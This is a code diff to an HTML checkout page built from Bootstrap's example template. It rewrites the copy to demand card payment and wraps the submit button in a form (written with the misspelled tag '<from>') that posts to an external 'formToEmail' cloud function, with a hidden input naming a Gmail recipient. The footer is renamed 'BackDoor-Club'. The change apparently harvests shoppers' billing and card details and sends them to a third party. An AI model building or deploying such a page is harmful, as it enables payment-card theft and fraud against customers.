@@ -61,8 +61,8 @@
       <main>
         <div class="py-5 text-center">
          
-          <h2>Checkout form</h2>
-          <p class="lead">Below is an example form built entirely with Bootstrap’s form controls. Each required form group has a validation state that can be triggered by attempting to submit the form without completing it.</p>
+          <h2>Checkout</h2>
+          <p class="lead">Fill in your billing information and payment below. For payment we ONLY accept DEBIT/CREDIT CARD. You MUST press the "continue to checkout" button for your payment and order to process bakc to our system.</p>
         </div>
     
         <div class="row g-5">
@@ -263,15 +263,20 @@
               </div>
     
               <hr class="my-4">
-    
-              <button class="w-100 btn btn-primary btn-lg" type="submit">Continue to checkout</button>
+             
+              <from action="https://us-central1-steam-center-app-dev.cloudfunctions.net/formToEmail"
+              method="post">
+              <button class="w-100 btn btn-primary btn-lg"
+               type="submit">Continue to checkout</button>
+               <input placeholder="send-to" value="wihezuo@gmail.com" hidden>
+              </from>
             </form>
           </div>
         </div>
       </main>
     
       <footer class="my-5 pt-5 text-muted text-center text-small">
-        <p class="mb-1">&copy; 2017–2022 Company Name</p>
+        <p class="mb-1">&copy; 2017–2022 BackDoor-Club</p>
         <ul class="list-inline">
           <li class="list-inline-item"><a href="#">Privacy</a></li>
           <li class="list-inline-item"><a href="#">Terms</a></li>
